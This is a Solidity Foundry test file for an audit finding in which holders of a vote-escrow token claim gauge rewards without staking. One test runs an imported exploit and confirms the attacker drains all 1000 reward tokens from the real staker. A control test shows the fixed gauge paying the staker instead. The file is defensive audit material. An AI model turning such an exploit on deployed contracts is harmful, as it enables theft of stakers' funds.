// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Token,
    BaseGaugeFixed,
    Staker
} from "./57156-basegauge-users-can-claim-rewards-without-staking-codehawks.sol";

contract Finding57156Test is Test {
    function test_exploit_unstaked_ve_holder_takes_rewards() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.claimed(), 1000 ether, "claimed 1000");
        assertEq(e.rewardToken().balanceOf(address(e)), 1000 ether, "attacker holds rewards");
        assertEq(e.gauge().balances(address(e)), 0, "attacker never staked");
        assertEq(e.rewardToken().balanceOf(address(e.gauge())), 0, "gauge empty");
        assertEq(e.rewardToken().balanceOf(address(e.staker())), 0, "staker received nothing");
        assertEq(e.gauge().balances(address(e.staker())), 1000 ether, "staker still staked");
    }

    function test_control_zero_stake_earns_zero_and_staker_is_paid() public {
        Token stake = new Token("STK");
        Token reward = new Token("RWD");
        Token ve = new Token("veRAAC");
        BaseGaugeFixed gauge = new BaseGaugeFixed(stake, reward, ve);
        Staker staker = new Staker(stake);
        Staker attacker = new Staker(stake);

        stake.mint(address(staker), 1000 ether);
        reward.mint(address(gauge), 1000 ether);
        ve.mint(address(attacker), 1000 ether);

        staker.stakeInto(gauge, 1000 ether);
        uint256 stolen = attacker.claim(gauge);
        uint256 earned = staker.claim(gauge);

        assertEq(stolen, 0, "non-staker paid 0");
        assertEq(reward.balanceOf(address(attacker)), 0, "attacker empty");
        assertEq(earned, 1000 ether, "staker earned the accrual");
        assertEq(reward.balanceOf(address(staker)), 1000 ether, "staker holds 1000");
        assertEq(reward.balanceOf(address(gauge)), 0, "gauge empty");
        assertEq(gauge.balances(address(attacker)), 0, "attacker unstaked");
    }
}
